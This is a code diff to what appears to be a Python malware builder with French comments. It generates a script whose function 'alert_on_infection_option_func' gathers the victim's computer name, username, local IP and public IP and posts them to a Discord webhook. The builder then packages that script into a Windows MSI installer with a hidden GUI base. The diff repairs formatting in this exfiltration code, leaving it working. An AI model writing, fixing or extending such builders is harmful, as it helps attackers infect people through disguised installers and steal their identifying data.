@@ -340,16 +340,17 @@ def pyw():
                 'ordi = platform.node()\n'
                 'hostname = socket.gethostname()\n\n'
                 'def alert_on_infection_option_func():\n'
-                '   ip = requests.get("https://api.ipify.org").text\n'
+                '    ip = requests.get("https://api.ipify.org").text\n'
                 '    discord_webhook = WEBHOOK\n'
                 '    name = (\n'
-                '        f"Nom de l\'ordinateur : {ordi}\\n"'
-                '        f"Utilisateur actuel : {getpass.getuser()}\\n"'
-                '        f"Adresse IP : {socket.gethostbyname(hostname)}\n"'
-                '        f"Adresse IP publique {ip}"'
+                '        f"Nom de l\'ordinateur : {ordi}\\n"\n'
+                '        f"Utilisateur actuel : {getpass.getuser()}\\n"\n'
+                '        f"Adresse IP locale : {socket.gethostbyname(hostname)}\\n"\n'
+                '        f"Adresse IP publique : {ip}"\n'
                 '    )\n'
                 '    requests.post(discord_webhook, json={"content": name})\n\n'
             )
+
 
         # Lancement des threads
         f.write("if __name__ == '__main__':\n")
@@ -390,7 +391,8 @@ def msi():
             f"    }},\n"
             f"    executables=[Executable('{temp_script}', base='Win32GUI')]\n"
             f")\n"
-        )
+    )
+
 
     # Lancement de la génération MSI avec subprocess
     result = subprocess.run(["python", setup_filename, "bdist_msi"], capture_output=True, text=True)
